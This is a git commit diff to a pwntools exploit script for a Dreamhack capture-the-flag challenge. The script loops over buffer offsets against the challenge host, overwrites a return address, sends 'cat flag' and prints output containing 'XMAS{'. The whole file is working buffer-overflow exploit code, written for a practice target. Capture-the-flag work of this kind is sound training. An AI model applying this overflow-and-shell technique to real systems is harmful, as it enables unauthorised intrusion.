75eeb8cbd85e211104f73084e25925c0159e1eca
woounnan <woounnan@gmail.com>
2020-12-25 07:19:04 +0000

    t

--- dreamhack/2020cm/baby_RudO/ex.py
+++ dreamhack/2020cm/baby_RudO/ex.py
@@ -1,7 +1,16 @@
 from pwn import *
-context.update(log_level= 'debug')
+#context.update(log_level= 'debug')
 for x in range(0x40):
     p = remote('host6.dreamhack.games', 15522)
     p.recvline()
     p.sendline('a'*(0x10+x) + p64(0x40069C))
-    p.interactive()
+    try:
+        p.sendline('cat flag')
+        _recv = p.recv(999)
+        _recv = p.recv(999)
+        if _recv.find('XMAS{') != -1:
+            print _recv
+            p.interactive()
+    except EOFError:
+        p.close()
+        continue
